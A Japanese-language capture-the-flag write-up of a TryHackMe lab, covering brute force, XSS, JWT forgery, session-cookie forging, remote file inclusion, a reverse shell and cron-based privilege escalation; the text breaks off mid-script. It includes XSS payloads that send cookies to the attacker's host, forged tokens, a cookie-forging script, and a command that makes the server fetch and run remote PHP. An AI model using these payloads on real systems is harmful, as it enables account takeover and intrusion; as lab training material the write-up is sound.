# Domino CTF

https://tryhackme.com/room/domino

## Enumeration

```shell
TARGET=10.144.186.217
sudo bash -c "echo $TARGET   domino.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```sh
root@ip-10-144-69-78:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.144.186.217
+ Target Hostname:    domino.thm
+ Target Port:        80
+ Start Time:         2026-07-07 04:29:10 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /backup/: Directory indexing found.
+ OSVDB-3092: /backup/: This might be interesting...
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-07-07 04:29:13 (GMT0) (3 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### /backup

http://domino.thm/backup/README.txt

```txt
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

/static/app.js に暗号キーが含まれていた。

```js
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
        _backupKey: 'N3xusK3y2024!!',
        appVersion: '2.3.1'
    };
以下略・・・
```

パディングをNULL文字として復号。

```sh
openssl enc -d -aes-128-ecb -in config.enc -out decrypted.txt -K 4E337875734B33793230323421210000
```

復号できたが、何に使えるか不明。

```json
$ cat decrypted.txt 
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

### teamsページから得た名前リスト

```txt
laura.hayes
michael.chen
sarah.johnson
robert.wilson
emma.taylor
david.brown
james.wright
```

fasttrack でブルートフォースしたところ、3人のログインパスワードが password になっていた。

```sh
$ hydra $TARGET http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials" -L users.txt -P /usr/share/wordlists/fasttrack.txt -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-07 00:43:36
[DATA] max 30 tasks per 1 server, overall 30 tasks, 1834 login tries (l:7/p:262), ~62 tries per task
[DATA] attacking http-post-form://10.144.186.217:80/index.php:username=^USER^&password=^PASS^:Invalid credentials
[80][http-post-form] host: 10.144.186.217   login: laura.hayes
[80][http-post-form] host: 10.144.186.217   login: michael.chen
[80][http-post-form] host: 10.144.186.217   login: sarah.johnson
[80][http-post-form] host: 10.144.186.217   login: sarah.johnson   password: password
[80][http-post-form] host: 10.144.186.217   login: robert.wilson
[80][http-post-form] host: 10.144.186.217   login: robert.wilson   password: password
[80][http-post-form] host: 10.144.186.217   login: emma.taylor
[80][http-post-form] host: 10.144.186.217   login: emma.taylor   password: password
[80][http-post-form] host: 10.144.186.217   login: david.brown
[80][http-post-form] host: 10.144.186.217   login: james.wright
```

sarah.johnson としてログイン。

## Dashboard

My Profile API で別のユーザーのプロフィールを取得可能な脆弱性がある。

http://domino.thm/api/users/profile.php?id=1

```json
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{[REDACTED]}"}
```

管理者ロールは laura.hayes だけだった。

## チケット

チケット作成画面でXSSを試した。

```html
<IMG SRC=/ onerror="eval('fe'+'tch(`http://192.168.131.34:8000/${doc'+'ument.c'+'ookie}`)')"></img>
```

リクエストは来たが、Cookieは取れなかった。

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.144.186.217 - - [07/Jul/2026 00:57:03] "GET / HTTP/1.1" 200 -
```

## API

JWTトークンを取得

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODM0MDAwMzEsImV4cCI6MTc4MzQwMzYzMX0.ZF6sAR6rIbOw3MoCkxEU4N2HTPAExKr5xYDyvb0pqRI","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}
```

/api/files.php を起動したが、Admin のJWTが必要との表示。

```sh
$ curl http://domino.thm/api/files.php?name=.env -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODM0MDAwMzEsImV4cCI6MTc4MzQwMzYzMX0.ZF6sAR6rIbOw3MoCkxEU4N2HTPAExKr5xYDyvb0pqRI"
{"error":"Admin JWT required. Check your token payload."} 
```

None アルゴリズムでAdminロールを試したら認証された模様。

```sh
$ curl http://domino.thm/api/files.php?name=.env -H 'Authorization: Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgzNDAwMDMxLCJleHAiOjE3ODM0MDM2MzF9.'
{"error":"Access denied: path must be within \/var\/www\/html\/"}  
```

.env は取れなかった。

```sh
curl http://domino.thm/api/files.php?name=/var/www/html/.env -H 'Authorization: Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgzNDAwMDMxLCJleHAiOjE3ODM0MDM2MzF9.'
```

index.php が取れた。

```sh
$ curl http://domino.thm/api/files.php?name=/var/www/html/index.php -H 'Authorization: Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgzNDAwMDMxLCJleHAiOjE3ODM0MDM2MzF9.'
{"file":"\/var\/www\/html\/index.php","content":"<?php\nrequire_once __DIR__ . '\/auth.php';\n$user = get_session();\nif ($user) { header('Location: \/dashboard.php'); exit; }\n$error = '';\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $username = trim($_POST['username'] ?? '');\n    $password = $_POST['password'] ?? '';\n    if ($username && $password) {\n        $db = get_db();\n        $stmt = $db->prepare('SELECT id, username, email, role, password_hash FROM users WHERE username = ?');\n        $stmt->execute([$username]);\n        $row = $stmt->fetch(PDO::FETCH_ASSOC);\n        if ($row && password_verify($password, $row['password_hash'])) {\n            $cookie_data = base64_encode(json_encode(['user_id' => $row['id'], 'username' => $row['username'], 'role' => $row['role']]));\n            $sig = hash_hmac('sha256', $cookie_data, APP_SECRET);\n            setcookie('nexus_session', $cookie_data . '.' . $sig, 0, '\/', '', false, false);\n            header('Location: \/dashboard.php');\n            exit;\n        } else {\n            $error = 'Invalid credentials';\n        }\n    }\n}\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<title>NexusCorp Portal<\/title>\n<link rel=\"stylesheet\" href=\"\/static\/style.css\">\n<\/head>\n<body class=\"login-page\">\n<div class=\"login-box\">\n  <div class=\"logo\"><span class=\"logo-icon\">&#9650;<\/span> NexusCorp<\/div>\n  <h2>Employee Portal<\/h2>\n  <?php if ($error): ?><div class=\"alert alert-danger\"><?= htmlspecialchars($error) ?><\/div><?php endif; ?>\n  <form method=\"POST\" action=\"\/index.php\">\n    <div class=\"form-group\">\n      <label>Username<\/label>\n      <input type=\"text\" name=\"username\" placeholder=\"firstname.lastname\" required>\n    <\/div>\n    <div class=\"form-group\">\n      <label>Password<\/label>\n      <input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n    <\/div>\n    <button type=\"submit\" class=\"btn-primary\">Sign In<\/button>\n  <\/form>\n  <div class=\"links\">\n    <a href=\"\/forgot.php\">Forgot password?<\/a> - <a href=\"\/team.php\">Our Team<\/a> \n  <\/div>\n<\/div>\n<\/body>\n<\/html>\n"} 
```

files.php の実装。realpathで正規化しているため、パストラバーサルはできないと思われる。

```php
<?php
require_once __DIR__ . \"\/..\/auth.php\";
header(\"Content-Type: application\/json\");

$jwt_payload = null;
if (isset($_SERVER[\"HTTP_AUTHORIZATION\"])) {
    $auth = $_SERVER[\"HTTP_AUTHORIZATION\"];
    if (strpos($auth, \"Bearer \") === 0) {
        $jwt_payload = verify_jwt(substr($auth, 7));
    }
}

if (!$jwt_payload) {
    http_response_code(401);
    echo json_encode([\"error\" => \"JWT token required. Get one from \/api\/auth\/token.php\"]);
    exit;
}

if (($jwt_payload[\"role\"] ?? \"\") !== \"admin\") {
    http_response_code(403);
    echo json_encode([\"error\" => \"Admin JWT required. Check your token payload.\"]);
    exit;
}

$name = $_GET[\"name\"] ?? \"\";
if (!$name) {
    http_response_code(400);
    echo json_encode([\"error\" => \"Missing name parameter\", \"usage\" => \"\/api\/files.php?name=\/var\/www\/html\/filename.txt\"]);
    exit;
}

\/\/ RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, \"http:\/\/\") === 0 || strpos($name, \"https:\/\/\") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode([\"error\" => \"Could not fetch remote file\"]);
        exit;
    }
    ob_start();
    eval(str_replace(\"<?php\", \"\", $remote));
    $output = ob_get_clean();
    echo json_encode([\"output\" => $output]);
    exit;
}

\/\/ Security check: resolve real path to prevent ..\/ traversal
$real = realpath($name);
if ($real === false || strpos($real, '\/var\/www\/html\/') !== 0) {
    http_response_code(403);
    echo json_encode([\"error\" => \"Access denied: path must be within \/var\/www\/html\/\"]);
    exit;
}

if (!file_exists($real)) {
    http_response_code(404);
    echo json_encode([\"error\" => \"File not found: \" . $real]);
    exit;
}

$content = file_get_contents($real);
echo json_encode([\"file\" => $real, \"content\" => $content]);
```

/support/index.php

```php
<?php
require_once __DIR__ . '\/..\/auth.php';
$user = require_login();
$db = get_db();
$stmt = $db->prepare('SELECT t.id, t.subject, t.created_at, t.viewed FROM tickets t WHERE t.user_id = ? ORDER BY t.created_at DESC');
$stmt->execute([$user['id']]);
$tickets = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang=\"en\">
<head>
<meta charset=\"UTF-8\">
<title>Support - NexusCorp<\/title>
<link rel=\"stylesheet\" href=\"\/static\/style.css\">
<\/head>
<body>
<nav class=\"navbar\">
  <div class=\"nav-brand\"><span class=\"logo-icon\">&#9650;<\/span> NexusCorp<\/div>
  <div class=\"nav-links\">
    <a href=\"\/dashboard.php\">Dashboard<\/a>
    <a href=\"\/support\/index.php\">Support<\/a>
    <a href=\"\/logout.php\">Logout<\/a>
  <\/div>
<\/nav>
<div class=\"container\">
  <div style=\"display:flex;justify-content:space-between;align-items:center\">
    <h1>Support Tickets<\/h1>
    <a href=\"\/support\/create.php\" class=\"btn-primary\">New Ticket<\/a>
  <\/div>
  <?php if (empty($tickets)): ?>
  <div class=\"card\"><p>No tickets yet. <a href=\"\/support\/create.php\">Open your first ticket<\/a>.<\/p><\/div>
  <?php else: ?>
  <table class=\"data-table\">
    <thead><tr><th>#<\/th><th>Subject<\/th><th>Status<\/th><th>Created<\/th><\/tr><\/thead>
    <tbody>
    <?php foreach ($tickets as $t): ?>
    <tr>
      <td><?= $t['id'] ?><\/td>
      <td><?= htmlspecialchars($t['subject']) ?><\/td>
      <td><?= $t['viewed'] ? '<span class=\"badge badge-green\">Reviewed<\/span>' : '<span class=\"badge badge-yellow\">Pending<\/span>' ?><\/td>
      <td><?= $t['created_at'] ?><\/td>
    <\/tr>
    <?php endforeach; ?>
    <\/tbody>
  <\/table>
  <?php endif; ?>
<\/div>
<\/body>
<\/html>
```

/support/create.php。やはりXSSの脆弱性は存在する。しかしAdminの表示側でどういう実装になっているかは不明。

```php
<?php
require_once __DIR__ . '\/..\/auth.php';
$user = require_login();
$msg = '';
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $subject = trim($_POST['subject'] ?? '');
    $message = trim($_POST['message'] ?? '');
    if ($subject && $message) {
        $db = get_db();
        \/\/ Message stored raw - no XSS filtering (intentional vulnerability)
        $stmt = $db->prepare('INSERT INTO tickets (user_id, subject, message) VALUES (?, ?, ?)');
        $stmt->execute([$user['id'], $subject, $message]);
        $msg = 'Ticket submitted successfully. An admin will review it shortly.';
    } else {
        $error = 'Subject and message are required.';
    }
}
?>
<!DOCTYPE html>
<html lang=\"en\">
<head>
<meta charset=\"UTF-8\">
<title>New Ticket - NexusCorp<\/title>
<link rel=\"stylesheet\" href=\"\/static\/style.css\">
<\/head>
<body>
<nav class=\"navbar\">
  <div class=\"nav-brand\"><span class=\"logo-icon\">&#9650;<\/span> NexusCorp<\/div>
  <div class=\"nav-links\">
    <a href=\"\/dashboard.php\">Dashboard<\/a>
    <a href=\"\/support\/index.php\">Support<\/a>
    <a href=\"\/logout.php\">Logout<\/a>
  <\/div>
<\/nav>
<div class=\"container\">
  <h1>Open Support Ticket<\/h1>
  <?php if ($error): ?><div class=\"alert alert-danger\"><?= htmlspecialchars($error) ?><\/div><?php endif; ?>
  <?php if ($msg): ?><div class=\"alert alert-success\"><?= htmlspecialchars($msg) ?><\/div><?php endif; ?>
  <div class=\"card\">
    <form method=\"POST\" action=\"\/support\/create.php\">
      <div class=\"form-group\">
        <label>Subject<\/label>
        <input type=\"text\" name=\"subject\" placeholder=\"Brief description of your issue\" required>
      <\/div>
      <div class=\"form-group\">
        <label>Message<\/label>
        <textarea name=\"message\" rows=\"8\" placeholder=\"Describe your issue in detail...\" required><\/textarea>
      <\/div>
      <button type=\"submit\" class=\"btn-primary\">Submit Ticket<\/button>
      <a href=\"\/support\/index.php\" class=\"btn-secondary\">Cancel<\/a>
    <\/form>
  <\/div>
<\/div>
<\/body>
<\/html>
```

## 再びXSS

リクエストは来るが、Cookieは送信されない。

```html
<IMG SRC=/ onerror="eval('fe'+'tch(`http://192.168.131.34:8000/${doc'+'ument.c'+'ookie}`)')"></img>
```

```html
<script>document.write('<img src="http://192.168.131.34:8000/' + document.cookie + '">')</script>
```

innerHTML も空でリクエストが来る。

```html
<script>document.write('<img src="http://192.168.131.34:8000/' + document.body.innerHTML + '">')</script>
```

調査した結果、JavascriptではなくURLを本文に書いただけでリクエストが来ている事がわかった。

td タグと textarea タグで閉じてみたが、Javascriptとしては実行されなかった。

```html
</td><script>document.write('<img src="http://192.168.131.34:8000/' + document.cookie + '">')</script><td>
```

```html
</textarea><script>document.write('<img src="http://192.168.131.34:8000/' + document.cookie + '">')</script><textarea>
```

## config.php

列挙で /config.php を発見。

```sh
root@ip-10-144-117-24:~# gobuster dir -q -x=php -u http://domino.thm/ -w ./dirlist.txt -t 64 -k
/403.php              (Status: 200) [Size: 322]
/admin                (Status: 301) [Size: 308] [--> http://domino.thm/admin/]
/api                  (Status: 301) [Size: 306] [--> http://domino.thm/api/]
/auth.php             (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 309] [--> http://domino.thm/backup/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> /index.php]
/forgot.php           (Status: 200) [Size: 684]
/index.php            (Status: 200) [Size: 861]
/javascript           (Status: 301) [Size: 313] [--> http://domino.thm/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/reset.php            (Status: 200) [Size: 410]
/static               (Status: 301) [Size: 309] [--> http://domino.thm/static/]
/support              (Status: 301) [Size: 310] [--> http://domino.thm/support/]
/team.php             (Status: 200) [Size: 3747]
```

パスワードは誰のログインパスワードとも一致しなかった。

```php
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', '[REDACTED]');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', '[REDACTED]');

function get_db() {
    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $pdo;
}
?>
"
```

auth.php。APP_SECRETが判明しているので、任意のユーザーIDのセッションCookieを生成できるはず。

```php
<?php
require_once __DIR__ . '\/config.php';

function get_session() {
    if (!isset($_COOKIE['nexus_session'])) return null;
    $raw = $_COOKIE['nexus_session'];
    \/\/ Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)
    $parts = explode('.', $raw, 2);
    if (count($parts) !== 2) return null;
    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
    if (!hash_equals($expected_sig, $parts[1])) return null;
    $decoded = base64_decode($parts[0]);
    $data = json_decode($decoded, true);
    if (!$data || !isset($data['user_id'])) return null;
    \/\/ Role always fetched from DB - cookie role value ignored
    $db = get_db();
    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');
    $stmt->execute([$data['user_id']]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function require_login() {
    $user = get_session();
    if (!$user) { header('Location: \/index.php'); exit; }
    return $user;
}

function require_admin() {
    $user = require_login();
    if ($user['role'] !== 'admin') {
        http_response_code(403);
        header('Content-Type: application\/json');
        echo json_encode(['error' => 'Forbidden']);
        exit;
    }
    return $user;
}

function generate_jwt($username) {
    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');
    \/\/ Bug: role always set to \"user\" regardless of actual user role
    $payload = rtrim(base64_encode(json_encode([
        'sub' => $username,
        'role' => 'user',
        'iat' => time(),
        'exp' => time() + 3600
    ])), '=');
    $sig = rtrim(base64_encode(hash_hmac('sha256', \"$header.$payload\", JWT_SECRET, true)), '=');
    return \"$header.$payload.$sig\";
}

function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    \/\/ Signature check intentionally disabled
    \/\/ $expected = rtrim(base64_encode(hash_hmac('sha256', \"$parts[0].$parts[1]\", JWT_SECRET, true)),'=');
    \/\/ if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
?>
```

gen.php を作成してセッションCookieを生成。

```php
<?php

$secret = "[REDACTED]";
$data_json = '{"user_id":1,"username":"laura.hayes","role":"admin"}';

$base64_json = base64_encode($data_json);
$raw_signature = hash_hmac('sha256', $base64_json, $secret);
$session_id = $base64_json . '.' . $raw_signature;

echo "Generated Session ID:\n";
echo $session_id . "\n";
?>
```

セッションCookieを生成。これを使って、laura.hayesとしてログイン成功した。

```sh
$ php -f ./gen.php 
Generated Session ID:
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0=.MTc5NzIzZjFmY[REDACTED]
```

## Admin

次はリモートコード実行とのことだが、手がかりがない。

/admin 配下のPHPを探したが、index.php 以外に無かった。

```sh
root@ip-10-144-117-24:~# gobuster dir -q -x=php -u http://domino.thm/admin/ -w ./dirlist.txt -t 64 -k -H "Cookie: nexus_session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0=.179723f1fbd3331a8f6cc790ebd2adfbff9fda87f2d4e4190ee0169eaf811025"
...
/index.php            (Status: 200) [Size: 1315]
```

/admin/index.php。RCEにつながる点はない。

```php
<?php
require_once __DIR__ . '\/..\/auth.php';

\/\/ Admin panel requires valid admin cookie OR valid admin JWT
$user = get_session();
$jwt_user = null;

if (isset($_SERVER['HTTP_AUTHORIZATION'])) {
    $auth = $_SERVER['HTTP_AUTHORIZATION'];
    if (strpos($auth, 'Bearer ') === 0) {
        $token = substr($auth, 7);
        $jwt_user = verify_jwt($token);
    }
}

\/\/ Must have either admin cookie session or JWT with role=admin
if (!$user || $user['role'] !== 'admin') {
    if (!$jwt_user || ($jwt_user['role'] ?? '') !== 'admin') {
        http_response_code(403);
        include __DIR__ . '\/..\/403.php';
        exit;
    }
    \/\/ JWT admin access - set display name
    $display = $jwt_user['sub'];
} else {
    $display = $user['username'];
}

\/\/ FLAG 2 is stored here
$flag2 = 'THM{[REDACTED]}';
?>
<!DOCTYPE html>
<html lang=\"en\">
<head>
<meta charset=\"UTF-8\">
<title>Admin Panel - NexusCorp<\/title>
<link rel=\"stylesheet\" href=\"\/static\/style.css\">
<\/head>
<body>
<nav class=\"navbar\">
  <div class=\"nav-brand\"><span class=\"logo-icon\">&#9650;<\/span> NexusCorp Admin<\/div>
  <div class=\"nav-links\">
    <a href=\"\/dashboard.php\">Portal<\/a>
    <a href=\"\/logout.php\">Logout<\/a>
  <\/div>
<\/nav>
<div class=\"container\">
  <div class=\"admin-header\">
    <h1>Administration Console<\/h1>
    <p>Logged in as: <strong><?= htmlspecialchars($display) ?><\/strong><\/p>
  <\/div>
  <div class=\"flag-box\">
    <h3>System Status<\/h3>
    <p>Internal reference: <code><?= $flag2 ?><\/code><\/p>
  <\/div>
  <div class=\"card-grid\">
    <div class=\"card\">
      <h3>User Management<\/h3>
      <p>Manage employee accounts and permissions.<\/p>
      <a href=\"\/api\/users\/profile.php?id=1\" class=\"btn-secondary\">View User API<\/a>
    <\/div>
    <div class=\"card\">
      <h3>File System Access<\/h3>
      <p>Internal document viewer via authenticated API.<\/p>
      <p><small>GET \/api\/files.php?name=[path] with Bearer token<\/small><\/p>
    <\/div>
    <div class=\"card\">
      <h3>Support Queue<\/h3>
      <p>Pending tickets requiring admin review.<\/p>
      <?php
      $db = get_db();
      $count = $db->query('SELECT COUNT(*) FROM tickets WHERE viewed = 0')->fetchColumn();
      echo \"<p><strong>$count<\/strong> unread tickets<\/p>\";
      ?>
    <\/div>
  <\/div>
<\/div>
<\/body>
<\/html>
```

files.php を見直したところ、RFIの脆弱性を発見した。

```php
\/\/ RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, \"http:\/\/\") === 0 || strpos($name, \"https:\/\/\") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode([\"error\" => \"Could not fetch remote file\"]);
        exit;
    }
    ob_start();
    eval(str_replace(\"<?php\", \"\", $remote));
    $output = ob_get_clean();
    echo json_encode([\"output\" => $output]);
    exit;
}

\/\/ Security check: resolve real path to prevent ..\/ traversal
$real = realpath($name);
if ($real === false || strpos($real, '\/var\/www\/html\/') !== 0) {
    http_response_code(403);
    echo json_encode([\"error\" => \"Access denied: path must be within \/var\/www\/html\/\"]);
    exit;
}
```

sys.php をホストして、コマンド実行成功した。

```sh
$ curl http://domino.thm/api/files.php?name=http://192.168.131.34:8000/sys.php -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4MzQxMDQyNywiZXhwIjoxNzgzNDE0MDI3fQ==.'
{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

リバースシェル取得成功。

```sh
$ nc -nlvp 8888                                   
listening on [any] 8888 ...
connect to [192.168.131.34] from (UNKNOWN) [10.144.186.217] 35138
Linux tryhackme-2404 6.17.0-1015-aws #15~24.04.1-Ubuntu SMP Thu May  7 17:00:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 07:50:24 up  3:28,  0 user,  load average: 0.00, 0.48, 1.97
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```sh
www-data@tryhackme-2404:/$ ls -al /opt
total 28
drwxrwxrwx  5 root     root     4096 May  7 20:26 .
drwxr-xr-x 22 root     root     4096 Jul  7 04:22 ..
drwxrwxr-x  2 ubuntu   ubuntu   4096 Apr 29 16:24 __pycache__
-rwxrwxrwx  1 root     root     1870 May  7 20:26 admin_bot.py
-rw-r--r--  1 www-data www-data   30 Apr 29 10:18 flag3.txt
drwxr-xr-x  2 root     root     4096 Apr 29 10:27 monitoring
drwxr-xr-x  2 root     root     4096 Apr 30 06:22 tools
```

## 権限昇格１

devopsユーザーへの昇格が必要。

```sh
www-data@tryhackme-2404:/$ ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Apr 29 09:37 .
drwxr-xr-x 22 root   root   4096 Jul  7 04:22 ..
drwxr-x---  3 devops devops 4096 May  9 17:19 devops
drwxr-xr-x  4 ubuntu ubuntu 4096 Apr 30 06:10 ubuntu
```

config.php から入手したパスワードで昇格成功。

```sh
www-data@tryhackme-2404:/$ su devops
Password: 
devops@tryhackme-2404:/$ 
```

```sh
devops@tryhackme-2404:/$ cd /home/devops
devops@tryhackme-2404:~$ ls -al
total 32
drwxr-x--- 3 devops devops 4096 May  9 17:19 .
drwxr-xr-x 4 root   root   4096 Apr 29 09:37 ..
-rw------- 1 devops devops  317 May  9 17:19 .bash_history
-rw-r--r-- 1 devops devops  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 devops devops 3771 Feb 25  2020 .bashrc
drwx------ 2 devops devops 4096 Apr 30 15:44 .cache
-rw-r--r-- 1 devops devops  807 Feb 25  2020 .profile
-rw-r--r-- 1 devops devops   34 Apr 29 10:27 user.txt
```

## 権限昇格２

devopsグループのシェルスクリプト

```sh
devops@tryhackme-2404:~$ ls -al /opt/monitoring/health_report.sh
-rwxrwxr-- 1 root devops 537 May 18 10:41 /opt/monitoring/health_report.sh

devops@tryhackme-2404:~$ cat /opt/monitoring/health_report.sh
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

ログファイルが更新されていて、rootオーナーになっているのでrootが実行しているかもしれない。

```sh
devops@tryhackme-2404:~$ tail /var/log/nexus_health.log
[2026-07-07 08:04:01] MySQL: OK
[2026-07-07 08:04:01] Disk: 7%
[2026-07-07 08:05:01] Health check started
[2026-07-07 08:05:01] Apache: OK
[2026-07-07 08:05:01] MySQL: OK
[2026-07-07 08:05:01] Disk: 7%
[2026-07-07 08:06:01] Health check started
[2026-07-07 08:06:01] Apache: OK
[2026-07-07 08:06:01] MySQL: OK
[2026-07-07 08:06:01] Disk: 7%

devops@tryhackme-2404:~$ ls -al /var/log/nexus_health.log
-rw-rw-rw- 1 root root 3973595 Jul  7 08:07 /var/log/nexus_health.log
```

pspyで確認。rootによって毎分起動されている。

```sh
2026/07/07 08:14:43 CMD: UID=0     PID=1      | /sbin/init 
2026/07/07 08:15:01 CMD: UID=0     PID=1694   | /usr/sbin/CRON -f -P 
2026/07/07 08:15:01 CMD: UID=0     PID=1693   | /usr/sbin/CRON -f -P 
2026/07/07 08:15:01 CMD: UID=0     PID=1695   | /usr/sbin/CRON -f -P 
2026/07/07 08:15:01 CMD: UID=0     PID=1696   | 
2026/07/07 08:15:01 CMD: UID=0     PID=1697   | /usr/sbin/CRON -f -P 
2026/07/07 08:15:01 CMD: UID=0     PID=1698   | /bin/sh -c /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1699   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1700   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1701   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1702   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1703   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1704   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1706   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:01 CMD: UID=0     PID=1705   | /bin/bash /opt/monitoring/health_report.sh 
2026/07/07 08:15:18 CMD: UID=0     PID=1707   | ps -e -o pid,ppid,state,command 
```

スクリプトを変更。

```sh
devops@tryhackme-2404:~$ cat /opt/monitoring/health_report.sh 
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")

